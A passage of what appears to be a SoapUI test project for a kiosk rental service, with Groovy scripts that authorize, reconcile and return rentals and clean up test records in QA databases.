	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Reconcile" id="efed8619-0c59-44b4-a3ee-f6ea15db84ce"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="c24cabaf-1408-4e75-9183-5e5130043f1f"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="471f7f11-e6d6-4bd6-9935-df39b438c389" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="048d1c12-f8b0-4ab1-9e60-b58bf45dcab8" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName("RedboxServerDB");
def rbconstring = rbConObj.getConnectionString();
log.info ("#########################################################################################")
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value/></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Authorize FINISHED</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value/></con:property><con:property><con:name>StartTime</con:name><con:value>04/23/18-15:45:29.649</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>04/23/18-15:45:33.841</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="c0670a8a-21aa-4890-a648-b3d33fd41b42" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Pickup_FreePromo" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="db78eec8-383a-486c-bde9-48a7596b71c3"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="e7a3f403-20b0-4593-81c5-1aceb211b870" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="74337391-ce22-4548-a103-3e399f64c084"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>Pickup</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="95895189-a38e-4e2e-a4e3-2d0daaeb6a4a"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//def ScenarioNo =  context.expand( '${DataSource#ID}' );
def ScenarioNo =  '00'
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("AccountNumber",getCP.getPropertyValue("CpAccountNumber"));

//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="f1a14dd6-ae3c-4964-a853-2be2efb8e93e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", "false");
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="bace58ba-3be2-450c-85f6-9d6464472667"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
